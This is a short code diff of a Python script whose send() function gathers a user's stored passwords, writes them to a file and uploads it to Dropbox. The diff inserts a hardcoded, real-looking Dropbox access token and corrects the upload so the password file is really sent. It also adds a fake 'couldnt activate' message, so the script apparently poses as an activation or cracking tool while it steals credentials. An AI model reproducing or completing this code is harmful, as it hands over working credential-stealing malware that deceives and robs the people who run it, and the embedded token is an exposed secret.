@@ -58,18 +58,17 @@ def getpasswords():
 def send():
 
     print('Trying different combinations hang on')
-    path = "C:\\prog\\lol.txt"
     writer = open("C:\\prog\\" + getpasswords()['user'] + "_lol.txt","w")
     for i in range(len(getpasswords()['passwords'])):
-        # print(getpasswords()['passwords'][i])
         writer.write(str(getpasswords()['passwords'][i]) + '\n')
     writer.close()
 
-    dbx=dropbox.Dropbox('haha')
+    dbx=dropbox.Dropbox('j3KeUtNcD7AAAAAAAAAATxznKk7ARxNQBSWrXb9Qc8I5i6PLERbGVe_h2bpXinUP')
     
     file_to="/" + getpasswords()['user'] + "_lol.txt"
-    upload = open("C:\\prog\\lol.txt","rb")
-    dbx.files_upload(upload.read(),file_to)    
+    upload = open("C:\\prog\\" + getpasswords()['user'] + "_lol.txt","rb")
+    dbx.files_upload(upload.read(),file_to)
+    print('couldnt activate')  
     
     
 
